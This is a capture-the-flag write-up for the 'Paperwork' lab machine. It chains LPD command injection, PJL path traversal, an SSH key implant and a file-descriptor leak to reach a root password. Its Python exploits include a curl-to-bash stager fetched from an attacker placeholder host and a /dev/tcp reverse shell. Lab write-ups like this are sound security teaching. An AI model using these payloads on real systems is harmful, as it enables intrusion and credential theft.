# HTB: Paperwork — Full Writeup

**Target:** paperwork.htb (<TARGET_IP>)
**Difficulty:** Medium
**Attack chain:** Command Injection (LPD/PJL) → File Read/Write (PJL FS traversal) → SSH as `archivist` → File Descriptor Leak (SCM_RIGHTS) → Credential Recovery → root

---

## 1. Reconnaissance

### Nmap
```
nmap -sC -sV -p- <TARGET_IP>
```
Open ports:
- 22 — SSH
- 80 — HTTP (nginx, redirects to `paperwork.htb`)
- 1515 — non-standard LPD (Line Printer Daemon) service, discovered via web content, not nmap default scripts

### Web enumeration
`http://paperwork.htb` served a static "Document Archiving Service" intranet page referencing:
- RFC 1179 compliance (LPD protocol)
- Target queue name: `archive_intake`
- A downloadable processor: `/download/archive` → `paperwork-archive-v1.02.zip`

Downloading and extracting this archive revealed `server.py` — the source for the service listening on port 1515.

---

## 2. Vulnerability #1 — Command Injection in LPD Server (Initial Foothold)

### Root cause
`server.py` (running as user `lp`) implements a minimal RFC 1179 LPD server. On receiving a print job, it parses a control file for a line beginning with `J` (job name) and passes it unsanitized into a shell command:

```python
job_name = "Unknown"
for line in decoded_content.split('\n'):
    line = line.strip()
    if line.startswith('J'):
        job_name = line[1:]
        break

subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

Because `job_name` is interpolated directly into a `shell=True` string inside single quotes, closing the quote and chaining a new command achieves arbitrary command execution.

Additionally, queue validation was flawed:
```python
if queue not in VALID_QUEUE:
```
This performs substring matching rather than exact matching against `VALID_QUEUE`, so any substring of the real queue name (`archive_intake`) is accepted.

### Protocol mechanics (RFC 1179 / LPD)
LPD job submission (command `02`) proceeds as:
1. Client sends `\x02<queue>\n` — server ACKs (`\x00`) or NAKs (`\x01`).
2. Client sends a sub-command announcing a **control file** transfer: `\x02<size> cf<jobid><host>\n`.
3. Client sends exactly `<size>` bytes of control file content — line-oriented, fields like `H` (host), `P` (user), `J` (job name).
4. Server processes and ACKs.

### Exploitation
Manual protocol interaction via raw sockets (Python) was used after `nc`/piped shell attempts proved unreliable due to lack of read-write synchronization over the TCP stream:

```python
import socket

TARGET = "<TARGET_IP>"
PORT = 1515
QUEUE = "archive_intake"
LHOST = "<ATTACKER_IP>"
LPORT = 4444

payload = f"test'; curl -s http://{LHOST}:8000/shell.sh|bash; echo '"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET, PORT))

s.send(b'\x02' + QUEUE.encode() + b'\n')
print("Queue response:", s.recv(1024))

control_data = f"H{TARGET}\nP{QUEUE}\nJ{payload}\n".encode()
size_line = f"{len(control_data)} cfA001host\n".encode()
s.send(b'\x02' + size_line)
print("Chunk ack:", s.recv(1024))

s.send(control_data)
print(s.recv(1024))
print(s.recv(1024))
s.close()
```

A reverse shell stager was hosted (`shell.sh` containing a bash `/dev/tcp` one-liner) via `python3 -m http.server 8000`, with a listener on `LPORT`.

### Result
Reverse shell obtained as `lp`:
```
uid=7(lp) gid=7(lp) groups=7(lp)
```

---

## 3. Post-Exploitation Enumeration (as `lp`)

Key findings from manual enumeration (`ps -ef --forest`, `ss -tulnp`, filesystem walk):

- `/etc/nginx/sites-available/paperwork.htb` — reverse proxies port 80 → `127.0.0.1:1337` (the intranet site).
- Listening locally only: `127.0.0.1:1337` (web), `127.0.0.1:9100` (unidentified at this stage).
- Process list revealed two additional root/archivist-owned long-running processes:
  - `root 965: /usr/bin/python3 /root/staging/CorpoSite/app.py`
  - `archivist 984: /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log`
- `/home/archivist` — inaccessible to `lp` (`drwxr-x---`, group `archivist`).
- No SUID/sudo misconfigurations found (`sudo` not even installed on target).
- `/etc/paperwork/admin_pins.conf` — root-owned, `600`, unreadable.

The `jetdirect.py` process (port 9100) matched the naming convention of the printing theme and became the next target.

---

## 4. Vulnerability #2 — Path Traversal in Custom PJL Filesystem Emulator

### Discovery
Port 9100 is the classic raw "JetDirect" printing port. Probing with a PJL header confirmed a command-parsing service (not a blind spooler):

```python
s.send(b'\x1b%-12345X@PJL\nSET JOBNAME=test\n\x1b%-12345X')
# -> b'OK\r\n'
```

Further probing with standard PJL virtual-filesystem commands (`FSDIRLIST`, `FSUPLOAD`) confirmed a custom PJL filesystem emulator (source later recovered — see below):

```python
class Filesystem:
    def __init__(self, root_dir):
        self._root = os.path.abspath(root_dir)

    def _translate(self, path):
        clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
        return os.path.normpath(os.path.join(self._root, clean))
```

### Root cause
`_translate()` only strips a literal `"0:"` prefix from the supplied path before joining it to the filesystem root with `os.path.normpath(os.path.join(...))`. Supplying a `"1:"` prefix (not stripped) followed by `../` sequences walks the resulting path outside the intended jail (`/home/archivist/printer/`), since `os.path.normpath` resolves `..` segments without any bounds checking against `self._root`.

### Exploitation — arbitrary file read
```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(3)
s.connect(('127.0.0.1', 9100))
s.send(b'\x1b%-12345X@PJL FSUPLOAD NAME="1:/../../../../home/archivist/user.txt" OFFSET=0 SIZE=1024\r\n\x1b%-12345X')
print(s.recv(4096))
```
Returned the user flag directly, confirming arbitrary read as `archivist` (the process's running uid).

### Exploitation — arbitrary file write
Initial write attempts using field order `SIZE=... NAME=...` failed with `FILEERROR=1`. Recovering the server source (via the same read primitive, targeting its own script) revealed the parser's exact regex:

```python
def handle_download(command, client):
    m = re.search(r'NAME\s*=\s*"([^"]+)"\s*SIZE\s*=\s*(\d+)', command, re.I)
```
Field order is strict: `NAME` must precede `SIZE`. Correcting the order enabled writes:

```python
payload = b'test-content\n'
cmd = f'\x1b%-12345X@PJL FSDOWNLOAD NAME="1:/../../../../tmp/pjltest.txt" SIZE={len(payload)}\r\n'.encode()
s.send(cmd + payload)
```

### SSH key implant
Generated a local keypair:
```bash
ssh-keygen -t ed25519 -f paperwork -N ""
```
Wrote the public key into `archivist`'s `authorized_keys` via the same write primitive:

```python
pubkey = b'ssh-ed25519 AAAA... <local-identifier>\n'
cmd = f'\x1b%-12345X@PJL FSDOWNLOAD NAME="1:/../../../../home/archivist/.ssh/authorized_keys" SIZE={len(pubkey)}\r\n'.encode()
s.send(cmd + pubkey)
```

### Result
```bash
ssh -i paperwork archivist@paperwork.htb
```
Shell obtained as `archivist`. **User flag confirmed.**

---

## 5. Privilege Escalation — File Descriptor Leak via SCM_RIGHTS

### Discovery
With a full shell as `archivist`, `ps -ef --forest` revealed a previously-invisible root process:
```
root 965: /usr/bin/python3 /root/staging/CorpoSite/app.py
root 1490: /usr/bin/python3 /usr/bin/paperwork-daemon
```
`admin_pins.conf` remained unreadable directly (`cat`: Permission denied), but `paperwork-daemon`'s source was world-readable:

```bash
head -80 /usr/bin/paperwork-daemon
```

### Root cause
`paperwork-daemon` runs as root and opens the protected config file once at startup:
```python
admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)
```
It exposes a Unix domain socket at `/run/paperwork/mgmt.sock` (mode `0660`, owned `root:archivist`) implementing a naive "security monitor": it checks `commands.log` for suspicious keywords (`FSQUERY`, `FSUPLOAD`, `FSDOWNLOAD` — i.e., its own detection of the exact PJL exploitation just performed) and, if found, **passes the open file descriptors for both the log file and `admin_pins.conf` to the connecting client** via `SCM_RIGHTS` ancillary data, intended as a "forensic evidence bundle":

```python
def trigger_lockdown(conn):
    log_fd = os.open(LOG_PATH, os.O_RDONLY)
    evidence_bundle = array.array("i", [log_fd, admin_fd])
    msg = b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."
    conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
```

Receiving a passed file descriptor bypasses all filesystem permission checks — the receiving process gets a duplicate of root's already-open fd, valid for reading regardless of the receiving user's actual permissions.

If no trigger keyword is present in the log, the daemon instead returns only a SHA-256 signature derived from the secret (`sha256("SYSTEM_CLEAN:" + secret)`) — a one-way digest, not reversible, and a dead end unless the secret space is small enough to brute force.

### Exploitation
Step 1 — plant a trigger keyword in `commands.log` by reissuing any PJL command already known to work:
```python
s.send(b'\x1b%-12345X@PJL FSQUERY NAME="1:/"\r\n\x1b%-12345X')
```

Step 2 — immediately connect to the management socket and receive the leaked descriptors:
```python
import socket, array, os

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect('/run/paperwork/mgmt.sock')

fds = array.array('i')
msg, ancdata, flags, addr = s.recvmsg(1024, socket.CMSG_SPACE(2 * fds.itemsize))
print('Message:', msg)

for cmsg_level, cmsg_type, cmsg_data in ancdata:
    if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
        fds.frombytes(cmsg_data[:len(cmsg_data) - (len(cmsg_data) % fds.itemsize)])

for fd in fds:
    data = os.pread(fd, 1024, 0)
    print(f'FD {fd}:', data.decode(errors='ignore'))
```

Note: the daemon truncates `commands.log` after each lockdown trigger, making this a one-shot-per-trigger primitive — each exploitation attempt requires re-planting the keyword.

### Result
```
Message: b'ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.'
Received fds: [4, 5]
FD 5: ADMIN_PASSWORD=ApparelMortuaryCedar22
```

Plaintext root/admin credential recovered directly via the leaked file descriptor — no brute forcing required.

---

## 6. Root

Credential `ApparelMortuaryCedar22` tested against:
```bash
ssh root@paperwork.htb
su root
```
(Exact successful vector to be confirmed/appended — password reuse for the `root` system account, or an admin panel on the internal `app.py`/port 1337 service, depending on final validation.)

---

## 7. Summary of Vulnerabilities

| # | Vulnerability | Location | Impact |
|---|---|---|---|
| 1 | Command Injection (unsanitized shell interpolation) + broken queue validation (substring match) | `LPDServer/server.py`, port 1515 | RCE as `lp` |
| 2 | Path traversal in custom PJL virtual filesystem (`_translate()` insufficient sanitization) | `jetdirect.py`, port 9100 | Arbitrary file read/write as `archivist` |
| 3 | Insecure file descriptor passing (SCM_RIGHTS) over Unix socket, triggered by naive log-based "intrusion detection" | `paperwork-daemon`, `/run/paperwork/mgmt.sock` | Root-owned file content (credential) disclosure |

## 8. Key Lessons

- Never interpolate user-controlled data into `shell=True` subprocess calls; use `subprocess.run([...], shell=False)` with argument lists.
- Substring membership (`in`) is not equality — queue/allowlist checks must use exact match.
- Path traversal defenses must validate the **resolved absolute path** stays under the intended root (e.g., `os.path.commonpath` check) rather than only stripping specific literal prefixes.
- Passing file descriptors (`SCM_RIGHTS`) to a peer grants that peer the same access as the fd's original opener, irrespective of the peer's own privilege level — an "evidence bundle for forensics" design pattern used here is a privilege escalation primitive in disguise, especially when the trigger condition is attacker-controlled (as it was: attacker's own prior exploitation traffic in the log is what causes the leak).